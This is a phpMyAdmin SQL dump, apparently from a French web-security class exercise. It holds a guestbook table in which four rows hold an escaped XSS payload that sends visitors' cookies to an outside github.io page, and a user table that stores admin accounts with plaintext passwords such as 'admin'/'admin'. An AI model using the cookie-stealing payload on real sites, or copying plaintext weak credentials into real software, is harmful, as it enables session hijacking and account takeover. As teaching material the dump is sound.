-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Hôte : 127.0.0.1:3306
-- Généré le : lun. 05 fév. 2024 à 12:44
-- Version du serveur : 8.2.0
-- Version de PHP : 8.2.13

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de données : `securite`
--

-- --------------------------------------------------------

--
-- Structure de la table `livredor`
--

DROP TABLE IF EXISTS `livredor`;
CREATE TABLE IF NOT EXISTS `livredor` (
  `id` int NOT NULL AUTO_INCREMENT,
  `mot` varchar(500) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=20 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `livredor`
--

INSERT INTO `livredor` (`id`, `mot`) VALUES
(1, 'Bien ce site !'),
(2, 'Cool :)'),
(5, 'super..'),
(12, 'test'),
(14, 'Super ton site'),
(15, 'hello poec'),
(16, '&lt;script&gt;document.location=&#039;https://tvinchent-epsi.github.io/xss.html?cookie=&#039;+document.cookie&lt;/script&gt;'),
(11, 'hello'),
(17, '&lt;script&gt;document.location=&#039;https://tvinchent-epsi.github.io/xss.html?cookie=&#039;+document.cookie&lt;/script&gt;'),
(18, '&lt;script&gt;document.location=&#039;https://tvinchent-epsi.github.io/xss.html?cookie=&#039;+document.cookie&lt;/script&gt;'),
(19, '&lt;script&gt;document.location=&#039;https://tvinchent-epsi.github.io/xss.html?cookie=&#039;+document.cookie&lt;/script&gt;');

-- --------------------------------------------------------

--
-- Structure de la table `user`
--

DROP TABLE IF EXISTS `user`;
CREATE TABLE IF NOT EXISTS `user` (
  `id` int NOT NULL AUTO_INCREMENT,
  `login` varchar(50) NOT NULL,
  `pwd` varchar(255) NOT NULL,
  `admin` varchar(5) NOT NULL DEFAULT 'false',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `user`
--

INSERT INTO `user` (`id`, `login`, `pwd`, `admin`) VALUES
(1, 'admin', 'admin', 'true'),
(2, 'test', 'test', 'true');
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
